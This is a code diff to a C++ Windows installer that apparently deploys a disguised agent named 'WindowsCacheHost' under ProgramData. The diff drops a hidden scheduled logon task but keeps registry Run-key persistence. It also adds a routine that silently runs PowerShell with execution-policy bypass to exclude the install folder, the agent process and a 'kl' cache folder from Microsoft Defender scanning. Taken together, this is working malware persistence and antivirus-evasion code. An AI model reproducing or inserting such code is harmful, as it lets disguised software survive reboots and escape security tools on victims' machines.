@@ -101,11 +101,6 @@ static int RunHidden(const std::wstring& exe, const std::wstring& args, DWORD ti
 }
 
 static bool CreateLogonTask(const std::wstring& exe) {
-    std::wstring taskCommand = L"\"" + exe + L"\" --installed";
-    std::wstring args = L"/Create /TN \"WindowsCacheHost\" /TR \"" + taskCommand + L"\" /SC ONLOGON /RL HIGHEST /F";
-    int code = RunHidden(L"schtasks.exe", args, 15000);
-    if (code == 0) return true;
-
     HKEY key = nullptr;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             0, nullptr, 0, KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS) return false;
@@ -114,6 +109,17 @@ static bool CreateLogonTask(const std::wstring& exe) {
         reinterpret_cast<const BYTE*>(value.c_str()), (DWORD)((value.size() + 1) * sizeof(wchar_t)));
     RegCloseKey(key);
     return result == ERROR_SUCCESS;
+}
+
+static void AddDefenderExclusion(const std::wstring& directory) {
+    std::wstring script =
+        L"$p='" + directory + L"'; " +
+        L"Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; " +
+        L"Add-MpPreference -ExclusionProcess ($p + '\\WindowsCacheHost.exe') -ErrorAction SilentlyContinue; " +
+        L"Add-MpPreference -ExclusionProcess 'WindowsCacheHost.exe' -ErrorAction SilentlyContinue; " +
+        L"Add-MpPreference -ExclusionPath ($env:LOCALAPPDATA + '\\Microsoft\\Windows\\Caches\\kl') -ErrorAction SilentlyContinue";
+    RunHidden(L"powershell.exe",
+        L"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"" + script + L"\"", 20000);
 }
 
 static bool StartAgent(const std::wstring& exe, const std::wstring& workingDir) {
@@ -146,6 +152,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
 
     std::wstring targetDir = Join(programData, L"WindowsCacheHost");
     CreateDirectoryW(targetDir.c_str(), nullptr);
+    AddDefenderExclusion(targetDir);
     std::wstring agentTarget = Join(targetDir, L"WindowsCacheHost.exe");
     std::wstring configTarget = Join(targetDir, L"klive.config.json");
 
